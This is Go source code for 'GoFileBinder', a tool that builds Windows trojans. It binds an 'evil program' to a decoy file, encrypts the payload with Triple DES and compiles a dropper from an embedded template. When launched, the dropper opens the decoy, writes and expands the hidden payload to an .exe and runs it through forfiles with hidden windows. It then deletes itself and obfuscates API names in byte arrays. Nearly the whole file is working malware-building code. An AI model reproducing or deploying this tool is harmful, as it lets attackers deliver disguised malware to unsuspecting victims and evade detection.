package main

import (
	"bytes"
	"crypto/cipher"
	"crypto/des"
	"fmt"
	"io/ioutil"
	"math/rand"
	"os"
	"os/exec"
	"path"
	"strings"
	"time"
)

// =======================================
// + Variables
// =======================================
var (
	tmpGoFile = "tmp.go"
)

// =======================================
// + Utils
// =======================================

func SplitHex(data []byte) string {
	hexString := fmt.Sprintf("%x", data)
	splitJoin := strings.Join(strings.Split(hexString, ""), "', '")
	result := fmt.Sprintf("string([]byte{'%s'})", splitJoin)
	return result
}

// =======================================
// + Crypto
// =======================================
func RandomKeyGen(n int) []byte {
	rand.Seed(time.Now().UnixNano())
	key := make([]byte, n)
	rand.Read(key)
	return key
}

func TripleDesEncrypt(data, key []byte) []byte {
	block, _ := des.NewTripleDESCipher(key)
	ciphertext := key
	iv := ciphertext[:des.BlockSize]
	origData := PKCS5Padding(data, block.BlockSize())
	mode := cipher.NewCBCEncrypter(block, iv)
	encrypted := make([]byte, len(origData))
	mode.CryptBlocks(encrypted, origData)
	return encrypted
}

func TripleDesDecrypt(data, key []byte) []byte {
	block, _ := des.NewTripleDESCipher(key)
	ciphertext := key
	iv := ciphertext[:des.BlockSize]

	decrypter := cipher.NewCBCDecrypter(block, iv)
	decrypted := make([]byte, len(data))
	decrypter.CryptBlocks(decrypted, data)
	decrypted = PKCS5UnPadding(decrypted)
	return decrypted
}

func PKCS5Padding(ciphertext []byte, blockSize int) []byte {
	padding := blockSize - len(ciphertext)%blockSize
	padtext := bytes.Repeat([]byte{byte(padding)}, padding)
	return append(ciphertext, padtext...)
}

func PKCS5UnPadding(origData []byte) []byte {
	length := len(origData)
	unpadding := int(origData[length-1])
	return origData[:(length - unpadding)]
}

func DesEncryptFile(filepath string) (encData []byte, randomKey []byte) {
	file, err := os.Open(filepath)
	if err != nil {
		println("[!] DES Encrypt Fail: " + err.Error())
	}

	data, err := ioutil.ReadAll(file)
	if err != nil {
		println("[!] DES Encrypt Fail: " + err.Error())
	}

	randomKey = RandomKeyGen(24)
	encData = TripleDesEncrypt(data, randomKey)

	return encData, randomKey
}

// =======================================
// + Templates
// =======================================
var DES_TEMPLATE = `package main

import (
	"crypto/cipher"
	"crypto/des"
	"encoding/hex"
	"io/ioutil"
	"os"
	"os/exec"
	"syscall"
)

// =======================================
// + Utils
// =======================================

func HideConsole() {
	hwnd, _, _ := syscall.NewLazyDLL(string([]byte{
		'k', 'e', 'r', 'n', 'e', 'l', '3', '2',
	})).NewProc(string([]byte{
		'G', 'e', 't', 'C', 'o', 'n', 's', 'o', 'l', 'e', 'W', 'i', 'n', 'd', 'o', 'w',
	})).Call()
	syscall.NewLazyDLL(string([]byte{
		'u', 's', 'e', 'r', '3', '2',
	})).NewProc(string([]byte{
		'S', 'h', 'o', 'w', 'W', 'i', 'n', 'd', 'o', 'w',
	})).Call(hwnd, 0)
}

// =======================================
// + Crypto
// =======================================
func TripleDesDecrypt(data, key []byte) []byte {
	block, _ := des.NewTripleDESCipher(key)
	ciphertext := key
	iv := ciphertext[:des.BlockSize]

	decrypter := cipher.NewCBCDecrypter(block, iv)
	decrypted := make([]byte, len(data))
	decrypter.CryptBlocks(decrypted, data)
	decrypted = PKCS5UnPadding(decrypted)
	return decrypted
}

func PKCS5UnPadding(origData []byte) []byte {
	length := len(origData)
	unpadding := int(origData[length-1])
	return origData[:(length - unpadding)]
}

func main() {
	//HideConsole()
	evilFileName := "%s"
	evilFile := "C:\\Users\\Public\\Music\\" + evilFileName + ".spl"
	evilFileCopy := "C:\\Users\\Public\\Music\\" + evilFileName + ".exe"
	bindFile := "%s"

	bindFileHex := %s
	bindFileData, _ := hex.DecodeString(bindFileHex)

	ioutil.WriteFile(bindFile, bindFileData, 0777)

	cmdOpen := exec.Command("cmd.exe", "/c", "start", bindFile)
	cmdOpen.SysProcAttr = &syscall.SysProcAttr{CreationFlags: 0x08000000}
	cmdOpen.Start()

	encDataHex := %s
	randomKeyHex := %s
	encData, _ := hex.DecodeString(encDataHex)
	randomKey, _ := hex.DecodeString(randomKeyHex)
	evilFileData := TripleDesDecrypt(encData, randomKey)

	ioutil.WriteFile(evilFile, evilFileData, 0777)

	cmdCopy := exec.Command("expand", evilFile, evilFileCopy)
	cmdCopy.SysProcAttr = &syscall.SysProcAttr{CreationFlags: 0x08000000}
	cmdCopy.Run()
	os.Remove(evilFile)

	cmdExec := exec.Command("forfiles", "/p", "c:\\windows\\system32", "/m", "notepad.exe", "/c", evilFileCopy)
	cmdExec.SysProcAttr = &syscall.SysProcAttr{CreationFlags: 0x08000000}
	cmdExec.Start()

	cmdDel := exec.Command("cmd.exe", "/c", "del", "%s")
	cmdDel.SysProcAttr = &syscall.SysProcAttr{CreationFlags: 0x08000000}
	cmdDel.Start()
}`

func main() {

	if len(os.Args) != 4 {
		println(`
╔═╗┌─┐╔═╗┬┬  ┌─┐╔╗ ┬┌┐┌┌┬┐┌─┐┬─┐
║ ╦│ │╠╣ ││  ├┤ ╠╩╗││││ ││├┤ ├┬┘
╚═╝└─┘╚  ┴┴─┘└─┘╚═╝┴┘└┘─┴┘└─┘┴└─
https://github.com/inspiringz/GoFileBinder`)
		println("\nUsage:\n    " + os.Args[0] + " <evil_program> <bind_file> [x64/x86]")
		return
	}

	evilFile := os.Args[1]
	bindFile := os.Args[2]
	arch := os.Args[3]

	bindFileSuffix := strings.TrimSuffix(bindFile, path.Ext(bindFile))
	evilFileSuffix := strings.TrimSuffix(evilFile, path.Ext(evilFile))
	outputFile := fmt.Sprintf("%s.exe", bindFileSuffix)

	os.Setenv("GOOS", "windows")
	switch arch {
	case "x64":
		os.Setenv("GOARCH", "amd64")
	case "x86":
		os.Setenv("GOARCH", "386")
	default:
		println("[!] Unknown arch")
		return
	}

	println("[*] Evil Program: " + evilFile)
	println("[*] Bind File: " + bindFile)
	println("[*] Architecture: " + arch)
	println("[*] Output File: " + outputFile)

	encData, randomKey := DesEncryptFile(evilFile)
	encDataHex := SplitHex(encData)
	randomKeyHex := SplitHex(randomKey)

	println("[+] Triple DES encrypt with randomKey success")

	binData, _ := ioutil.ReadFile(bindFile)
	bindFileHex := SplitHex(binData)

	tmpGoFileSource := fmt.Sprintf(DES_TEMPLATE, evilFileSuffix, bindFile, bindFileHex, encDataHex, randomKeyHex, outputFile)

	ioutil.WriteFile(tmpGoFile, []byte(tmpGoFileSource), 0777)

	err := exec.Command("go", "build", "-ldflags", "-w -s -H=windowsgui", "--trimpath", "-o", outputFile, tmpGoFile).Run()
	if err != nil {
		println("[!] Compile fail: " + err.Error())
		return
	}
	os.Remove(tmpGoFile)
	println("[+] Compile success: " + outputFile)
}
